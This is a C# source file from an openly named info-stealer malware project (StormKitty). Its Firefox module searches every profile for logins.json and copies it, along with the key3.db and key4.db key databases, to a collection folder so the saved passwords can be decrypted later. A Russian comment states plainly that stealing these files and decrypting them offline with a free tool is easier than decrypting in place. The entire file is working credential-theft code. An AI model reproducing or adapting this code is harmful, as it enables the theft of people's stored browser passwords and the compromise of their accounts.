/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System.IO;

namespace Stealer.Firefox
{
    internal sealed class cLogins
    {
		private static string[] keyFiles = new string[] { "key3.db", "key4.db", "logins.json" };
		
		// Copy key3.db, key4.db, logins.json if exists
		private static void CopyDatabaseFile(string from, string sSavePath)
		{
			try
			{
				if (File.Exists(from))
					File.Copy(from, sSavePath + "\\" + Path.GetFileName(from));
			}
			catch { }
		}

		/*
			Дешифровка паролей Gecko браузеров - та еще жопa.
			Проще стырить два файла(key3.dll/key4.dll и logins.json)
			и расшифровать их бесплатной прогой от NirSoft.
			https://www.nirsoft.net/utils/passwordfox.html
		*/
		public static void GetDBFiles(string path, string sSavePath)
		{
			// If browser path not exists
			if (!Directory.Exists(path))
				return;

			// Detect logins.json file
			string[] files = Directory.GetFiles(path, "logins.json", SearchOption.AllDirectories);
			if (files == null)
				return;

			foreach (string dbpath in files)
			{
				// Copy key3.db, key4.db, logins.json
				foreach (string db in keyFiles)
					CopyDatabaseFile(Path.Combine(Path.GetDirectoryName(dbpath), db), sSavePath);
			}
		}

	}
}
